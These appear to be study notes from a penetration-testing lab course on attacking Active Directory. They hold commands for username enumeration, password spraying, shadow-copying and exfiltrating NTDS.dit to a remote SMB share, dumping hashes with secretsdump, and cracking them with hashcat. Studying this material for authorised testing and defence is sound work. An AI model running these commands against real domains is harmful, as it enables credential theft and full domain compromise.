## Attacking Active Directory and NTDS.dit

Internet → Initial Compromise → Internal Network → Domain Controller

![](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/ADauthentication_diagram.png)

- The computer sends login requests to the DC, then the DC validates the credentials.

### Dictionary Attack Against AD

Collect information about the organization.

May discover:

- Employee names
- Username naming conventions

Examples:

```
firstinitial + lastname
firstinitial + middleinitial + lastname
firstname.lastname
first.last
last.first
nickname
```

- Create username list.

**Username Anarchy**

Ruby tool that creates common username formats automatically.

```
./username-anarchy -i names.txt
```

### Enumerate Valid Usernames

```
kerbrute userenum -dc ip --domain ad-domain-name usernames.txt
```

Dictionary attack with NetExec:

```
netexec smb ip -u username -p pass.txt
```

### Next - Dump NTDS.dit

`dit` = **Directory Information Tree**

After obtaining valid credentials:

Connect to DC:

```
evil-winrm -i ip -u username -p password
```

Check local groups:

```
net localgroup
```

Check domain privileges:

```
net user username
```

### Create a Shadow Copy

```
vssadmin CREATE SHADOW /For=C:
```

(VSS = Volume Shadow Copy Service)

### Copy NTDS.dit from the Shadow Copy

```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

Like SAM, to decrypt **NTDS.dit** we also need the **SYSTEM** registry hive.

- **Transfer NTDS.dit:**

```
cmd.exe /c move C:\NTDS.dit \\ip\CompData
```

- **Extract password hashes:**

```
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

- **A faster method:**

Use NetExec to capture NTDS.dit.

```
netexec smb ip -u username -p password -M ntdsutil
```

- **Crack hashes:**

```
hashcat -m 1000
```
